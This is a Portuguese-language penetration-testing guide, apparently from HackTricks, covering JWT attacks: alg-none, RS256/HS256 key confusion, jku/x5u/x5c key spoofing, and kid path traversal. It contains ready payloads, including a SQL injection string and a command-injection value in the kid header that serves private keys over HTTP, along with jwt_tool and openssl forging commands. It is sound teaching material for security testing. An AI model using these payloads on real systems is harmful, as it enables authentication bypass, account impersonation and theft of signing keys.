# Vulnerabilidades JWT (Json Web Tokens)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se voc√™ est√° interessado em **carreira de hacking** e hackear o inhacke√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada √© necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

**Parte deste post √© baseada no √≥timo post:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor da √≥tima ferramenta para pentest JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Vit√≥rias R√°pidas**

Execute [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) com o modo `All Tests!` e aguarde linhas verdes.
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Se voc√™ tiver sorte, a ferramenta encontrar√° algum caso em que a aplica√ß√£o web est√° verificando incorretamente o JWT:

![](<../.gitbook/assets/image (935).png>)

Ent√£o, voc√™ pode procurar a solicita√ß√£o em seu proxy ou despejar o JWT usado para essa solicita√ß√£o usando jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
Voc√™ tamb√©m pode usar a [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) para lan√ßar ataques JWT a partir do Burp.

### Manipular dados sem modificar nada

Voc√™ pode apenas manipular os dados deixando a assinatura como est√° e verificar se o servidor est√° checando a assinatura. Tente mudar seu nome de usu√°rio para "admin", por exemplo.

#### **A token √© verificada?**

Para verificar se a assinatura de um JWT est√° sendo verificada:

* Uma mensagem de erro sugere verifica√ß√£o em andamento; detalhes sens√≠veis em erros verbosos devem ser revisados.
* Uma mudan√ßa na p√°gina retornada tamb√©m indica verifica√ß√£o.
* Nenhuma mudan√ßa sugere nenhuma verifica√ß√£o; √© quando se deve experimentar com a manipula√ß√£o das reivindica√ß√µes do payload.

### Origem

√â importante determinar se o token foi gerado do lado do servidor ou do lado do cliente examinando o hist√≥rico de requisi√ß√µes do proxy.

* Tokens vistos pela primeira vez do lado do cliente sugerem que a chave pode estar exposta ao c√≥digo do lado do cliente, necessitando de investiga√ß√£o adicional.
* Tokens originados do lado do servidor indicam um processo seguro.

### Dura√ß√£o

Verifique se o token dura mais de 24h... talvez ele nunca expire. Se houver um campo "exp", verifique se o servidor est√° lidando com ele corretamente.

### For√ßa bruta da chave secreta HMAC

[**Veja esta p√°gina.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modificar o algoritmo para Nenhum

Defina o algoritmo usado como "Nenhum" e remova a parte da assinatura.

Use a extens√£o Burp chamada "JSON Web Token" para tentar essa vulnerabilidade e para mudar diferentes valores dentro do JWT (envie a requisi√ß√£o para Repeater e na aba "JSON Web Token" voc√™ pode modificar os valores do token. Voc√™ tamb√©m pode selecionar para colocar o valor do campo "Alg" como "Nenhum").

### Mudar o algoritmo RS256 (assim√©trico) para HS256 (sim√©trico) (CVE-2016-5431/CVE-2016-10555)

O algoritmo HS256 usa a chave secreta para assinar e verificar cada mensagem.\
O algoritmo RS256 usa a chave privada para assinar a mensagem e usa a chave p√∫blica para autentica√ß√£o.

Se voc√™ mudar o algoritmo de RS256 para HS256, o c√≥digo do back end usa a chave p√∫blica como a chave secreta e ent√£o usa o algoritmo HS256 para verificar a assinatura.

Ent√£o, usando a chave p√∫blica e mudando RS256 para HS256, poder√≠amos criar uma assinatura v√°lida. Voc√™ pode recuperar o certificado do servidor web executando isso:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nova chave p√∫blica dentro do cabe√ßalho

Um atacante incorpora uma nova chave no cabe√ßalho do token e o servidor usa essa nova chave para verificar a assinatura (CVE-2018-0114).

Isso pode ser feito com a extens√£o "JSON Web Tokens" do Burp.\
(Envie a solicita√ß√£o para o Repeater, dentro da aba JSON Web Token selecione "CVE-2018-0114" e envie a solicita√ß√£o).

### Spoofing de JWKS

As instru√ß√µes detalham um m√©todo para avaliar a seguran√ßa dos tokens JWT, particularmente aqueles que utilizam uma reivindica√ß√£o de cabe√ßalho "jku". Essa reivindica√ß√£o deve vincular-se a um arquivo JWKS (JSON Web Key Set) que cont√©m a chave p√∫blica necess√°ria para a verifica√ß√£o do token.

* **Avalia√ß√£o de Tokens com Cabe√ßalho "jku"**:
* Verifique a URL da reivindica√ß√£o "jku" para garantir que ela leva ao arquivo JWKS apropriado.
* Modifique o valor "jku" do token para direcionar a um servi√ßo web controlado, permitindo a observa√ß√£o do tr√°fego.
* **Monitoramento de Intera√ß√£o HTTP**:
* Observar solicita√ß√µes HTTP para sua URL especificada indica as tentativas do servidor de buscar chaves do link fornecido.
* Ao empregar `jwt_tool` para esse processo, √© crucial atualizar o arquivo `jwtconf.ini` com sua localiza√ß√£o pessoal do JWKS para facilitar os testes.
* **Comando para `jwt_tool`**:
*   Execute o seguinte comando para simular o cen√°rio com `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Vis√£o Geral de Problemas com Kid

Uma reivindica√ß√£o de cabe√ßalho opcional conhecida como `kid` √© utilizada para identificar uma chave espec√≠fica, que se torna particularmente vital em ambientes onde m√∫ltiplas chaves existem para a verifica√ß√£o da assinatura do token. Essa reivindica√ß√£o ajuda na sele√ß√£o da chave apropriada para verificar a assinatura de um token.

#### Revelando Chave atrav√©s de "kid"

Quando a reivindica√ß√£o `kid` est√° presente no cabe√ßalho, √© aconselh√°vel procurar no diret√≥rio da web pelo arquivo correspondente ou suas varia√ß√µes. Por exemplo, se `"kid":"key/12345"` for especificado, os arquivos _/key/12345_ e _/key/12345.pem_ devem ser procurados na raiz da web.

#### Traversal de Caminho com "kid"

A reivindica√ß√£o `kid` tamb√©m pode ser explorada para navegar pelo sistema de arquivos, potencialmente permitindo a sele√ß√£o de um arquivo arbitr√°rio. √â vi√°vel testar a conectividade ou executar ataques de Server-Side Request Forgery (SSRF) alterando o valor `kid` para direcionar arquivos ou servi√ßos espec√≠ficos. Manipular o JWT para mudar o valor `kid` enquanto mant√©m a assinatura original pode ser alcan√ßado usando a flag `-T` no jwt\_tool, como demonstrado abaixo:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Ao direcionar arquivos com conte√∫do previs√≠vel, √© poss√≠vel forjar um JWT v√°lido. Por exemplo, o arquivo `/proc/sys/kernel/randomize_va_space` em sistemas Linux, conhecido por conter o valor **2**, pode ser usado no par√¢metro `kid` com **2** como a senha sim√©trica para a gera√ß√£o do JWT.

#### SQL Injection via "kid"

Se o conte√∫do da reivindica√ß√£o `kid` for empregado para buscar uma senha em um banco de dados, uma inje√ß√£o SQL pode ser facilitada ao modificar o payload `kid`. Um exemplo de payload que utiliza inje√ß√£o SQL para alterar o processo de assinatura do JWT inclui:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Essa altera√ß√£o for√ßa o uso de uma chave secreta conhecida, `ATTACKER`, para a assinatura do JWT.

#### OS Injection atrav√©s de "kid"

Um cen√°rio onde o par√¢metro `kid` especifica um caminho de arquivo usado dentro de um contexto de execu√ß√£o de comando pode levar a vulnerabilidades de Execu√ß√£o Remota de C√≥digo (RCE). Ao injetar comandos no par√¢metro `kid`, √© poss√≠vel expor chaves privadas. Um exemplo de payload para alcan√ßar RCE e exposi√ß√£o de chave √©:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u e jku

#### jku

jku significa **JWK Set URL**.\
Se o token usar uma reivindica√ß√£o de **Header** ‚Äú**jku**‚Äù, ent√£o **verifique a URL fornecida**. Isso deve apontar para uma URL contendo o arquivo JWKS que possui a Chave P√∫blica para verificar o token. Modifique o token para apontar o valor jku para um servi√ßo web que voc√™ possa monitorar o tr√°fego.

Primeiro, voc√™ precisa criar um novo certificado com novas chaves privadas e p√∫blicas.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Ent√£o voc√™ pode usar, por exemplo, [**jwt.io**](https://jwt.io) para criar o novo JWT com as **chaves p√∫blicas e privadas criadas e apontando o par√¢metro jku para o certificado criado.** Para criar um certificado jku v√°lido, voc√™ pode baixar o original e alterar os par√¢metros necess√°rios.

Voc√™ pode obter os par√¢metros "e" e "n" de um certificado p√∫blico usando:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

URL X.509. Um URI apontando para um conjunto de certificados p√∫blicos X.509 (um padr√£o de formato de certificado) codificados em formato PEM. O primeiro certificado no conjunto deve ser aquele usado para assinar este JWT. Os certificados subsequentes assinam cada um o anterior, completando assim a cadeia de certificados. X.509 √© definido na RFC 52807. A seguran√ßa de transporte √© necess√°ria para transferir os certificados.

Tente **mudar este cabe√ßalho para uma URL sob seu controle** e verifique se alguma solicita√ß√£o √© recebida. Nesse caso, voc√™ **poderia adulterar o JWT**.

Para forjar um novo token usando um certificado controlado por voc√™, voc√™ precisa criar o certificado e extrair as chaves p√∫blica e privada:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Ent√£o voc√™ pode usar, por exemplo, [**jwt.io**](https://jwt.io) para criar o novo JWT com as **chaves p√∫blicas e privadas criadas e apontando o par√¢metro x5u para o certificado .crt criado.**

![](<../.gitbook/assets/image (956).png>)

Voc√™ tamb√©m pode abusar de ambas essas vulnerabilidades **para SSRFs**.

#### x5c

Este par√¢metro pode conter o **certificado em base64**:

![](<../.gitbook/assets/image (1119).png>)

Se o atacante **gerar um certificado autoassinado** e criar um token forjado usando a chave privada correspondente e substituir o valor do par√¢metro "x5c" pelo certificado rec√©m-gerado e modificar os outros par√¢metros, nomeadamente n, e e x5t, ent√£o essencialmente o token forjado seria aceito pelo servidor.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Chave P√∫blica Embutida (CVE-2018-0114)

Se o JWT tiver uma chave p√∫blica embutida como no seguinte cen√°rio:

![](<../.gitbook/assets/image (624).png>)

Usando o seguinte script nodejs, √© poss√≠vel gerar uma chave p√∫blica a partir desses dados:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
√â poss√≠vel gerar uma nova chave privada/p√∫blica, embutir a nova chave p√∫blica dentro do token e us√°-la para gerar uma nova assinatura:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Voc√™ pode obter o "n" e "e" usando este script nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finalmente, usando a chave p√∫blica e privada e os novos valores "n" e "e", voc√™ pode usar [jwt.io](https://jwt.io) para forjar um novo JWT v√°lido com qualquer informa√ß√£o.

### ES256: Revelando a chave privada com o mesmo nonce

Se algumas aplica√ß√µes usam ES256 e utilizam o mesmo nonce para gerar dois jwts, a chave privada pode ser restaurada.

Aqui est√° um exemplo: [ECDSA: Revelando a chave privada, se o mesmo nonce for usado (com SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

A reivindica√ß√£o JTI (JWT ID) fornece um identificador √∫nico para um Token JWT. Ele pode ser usado para evitar que o token seja reproduzido.\
No entanto, imagine uma situa√ß√£o em que o comprimento m√°ximo do ID √© 4 (0001-9999). As requisi√ß√µes 0001 e 10001 v√£o usar o mesmo ID. Portanto, se o backend estiver incrementando o ID em cada requisi√ß√£o, voc√™ poderia abusar disso para **repetir uma requisi√ß√£o** (precisando enviar 10000 requisi√ß√µes entre cada repeti√ß√£o bem-sucedida).

### Reivindica√ß√µes registradas do JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Outros ataques

**Ataques de Relay entre servi√ßos**

Foi observado que algumas aplica√ß√µes web dependem de um servi√ßo JWT confi√°vel para a gera√ß√£o e gerenciamento de seus tokens. Foram registrados casos em que um token, gerado para um cliente pelo servi√ßo JWT, foi aceito por outro cliente do mesmo servi√ßo JWT. Se a emiss√£o ou renova√ß√£o de um JWT via um servi√ßo de terceiros for observada, a possibilidade de se inscrever em uma conta em outro cliente desse servi√ßo usando o mesmo nome de usu√°rio/e-mail deve ser investigada. Em seguida, deve-se tentar reproduzir o token obtido em uma requisi√ß√£o para o alvo para ver se √© aceito.

* Um problema cr√≠tico pode ser indicado pela aceita√ß√£o do seu token, potencialmente permitindo a falsifica√ß√£o da conta de qualquer usu√°rio. No entanto, deve-se notar que a permiss√£o para testes mais amplos pode ser necess√°ria se inscrevendo em uma aplica√ß√£o de terceiros, pois isso pode entrar em uma √°rea cinza legal.

**Verifica√ß√£o de Expira√ß√£o de Tokens**

A expira√ß√£o do token √© verificada usando a reivindica√ß√£o "exp" do Payload. Dado que os JWTs s√£o frequentemente empregados sem informa√ß√µes de sess√£o, um manuseio cuidadoso √© necess√°rio. Em muitas inst√¢ncias, capturar e reproduzir o JWT de outro usu√°rio poderia permitir a impersonifica√ß√£o desse usu√°rio. O RFC do JWT recomenda mitigar ataques de repeti√ß√£o de JWT utilizando a reivindica√ß√£o "exp" para definir um tempo de expira√ß√£o para o token. Al√©m disso, a implementa√ß√£o de verifica√ß√µes relevantes pela aplica√ß√£o para garantir o processamento desse valor e a rejei√ß√£o de tokens expirados √© crucial. Se o token incluir uma reivindica√ß√£o "exp" e os limites de tempo de teste permitirem, √© aconselh√°vel armazenar o token e reproduzi-lo ap√≥s o tempo de expira√ß√£o ter passado. O conte√∫do do token, incluindo a an√°lise de timestamp e verifica√ß√£o de expira√ß√£o (timestamp em UTC), pode ser lido usando a flag -R da jwt_tool.

* Um risco de seguran√ßa pode estar presente se a aplica√ß√£o ainda validar o token, pois isso pode implicar que o token nunca poderia expirar.

### Ferramentas

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se voc√™ est√° interessado em **carreira de hacking** e hackear o inhacke√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
